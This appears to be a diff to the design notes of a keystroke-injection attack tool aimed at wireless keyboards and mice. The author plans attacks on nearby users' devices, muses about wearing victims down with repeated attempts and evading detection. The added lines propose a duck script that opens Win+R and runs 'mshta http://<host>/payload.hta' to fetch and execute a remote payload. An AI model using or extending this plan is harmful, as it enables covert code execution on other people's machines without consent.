@@ -45,5 +45,7 @@ The humans are very aware. In a recent test, only 3 out of ~25 were successfully
 
 Practically, not much can be done to stop this attack beyond ditching the vulnerable devices. I wanted to attack each device, only once, immediately after verifying its current channel. This would result in the most accurate and successful attacks, while respecting the target users' integrity; everyone's working and I don't want to overwhelmingly interefere with their day. That being said, I could also just sit there and attack a device until I wear down the user enough for a successful execution. They can't really stop it, beyond locking their machines, disconnecting the devices, and walking away - creating a DoS of a different type; good luck finding me.
 
+Creating a share requires Admin privliges, so I guess that's not an option. Next idea for faster exploitation: use an HTA pre-stage that writes the first-stage payload to disk and executes it. The duck script should then be a quick Win+R and "mshta http://<host>/payload.hta".
+
 ## TODO
-Add logic and tasking to create an internal share, upload first-stage payloads to said share, and inject attacks that execute the shared payloads (would be much faster and less noticeable).
+Add logic for the pre-stage HTA attack (would be much faster and less noticeable).
